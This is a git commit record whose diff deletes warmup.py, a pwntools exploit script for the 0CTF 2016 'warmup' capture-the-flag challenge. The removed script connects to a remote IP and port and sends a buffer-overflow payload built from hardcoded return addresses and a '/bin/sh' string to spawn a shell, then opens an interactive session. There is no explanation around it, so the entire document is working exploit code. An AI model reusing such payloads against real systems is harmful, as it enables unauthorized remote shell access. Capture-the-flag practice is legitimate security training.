1d0ab80d3429f4c1f2e5fff1d2af6143436d23e5
Ring3 <328149598@qq.com>
2016-04-01 19:36:28 +0800

    first change

--- 0ctf2016/warmup.py
+++
@@ -1,7 +0,0 @@
-from pwn import *
-#p=process('./warmup')
-p=remote('202.120.7.207','52608')
-p.recvuntil('!')
-#p.send('a'*(0x34-20)+p32(0x804811D)+p32(0x8048112)+p32(0)+p32(0x80491BC)+p32(11)+'/bin/sh'+p32(0))
-p.send('a'*(0x34-20)+p32(0x80480d8)+'a'*0x30+p32(0x804811D)+p32(0x80480d8)+p32(0)+p32(0x80491BC)+p32(16)+'/bin/sh\x00'+p32(0x80491BC)+p32(0)+'a'*(0x34-20)+p32(0x804811D)+p32(0x8048122)+p32(0)+p32(0x80491BC)+p32(0x80491BC+8)+'/bin/sh\x00\xbc\x91\x04')
-p.interactive()
